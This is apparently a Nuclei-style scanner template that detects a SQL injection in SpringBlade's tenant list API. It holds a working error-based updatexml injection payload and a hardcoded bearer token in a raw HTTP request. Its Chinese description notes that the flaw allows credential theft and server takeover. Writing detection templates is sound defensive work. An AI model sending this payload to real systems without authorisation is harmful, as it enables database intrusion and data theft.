id: SpringBlade-tenant-list-sql

info:
  name: "SpringBlade tenantist 接口 SQL 注入漏洞"
  author: Unknown
  severity: high
  description: SpringBlade 后台框架的 /api/blade-system/tenantist 接口存在 SQL 注入漏洞。攻击者可通过构造恶意 SQL 语句实现数据库未授权访问，包括敏感数据提取（如管理员凭据、用户个人信息），并在具备高权限条件下向服务器写入恶意代码，最终可能实现对目标系统的完全控制。
  tags: SpringBlade

http:
- raw:
  - |
    GET /api/blade-system/tenant/list?updatexml(1,concat(0x7e,version(),0x7e),1)=1 HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
    Blade-Auth: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..RtS67Tmbo7yFKHyMz_bMQW7dfgNjxZW47KtnFcwItxQ
    Connection: close
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - 'java.sql.SQLException: XPATH syntax error:'
  - type: status
    status:
    - 500





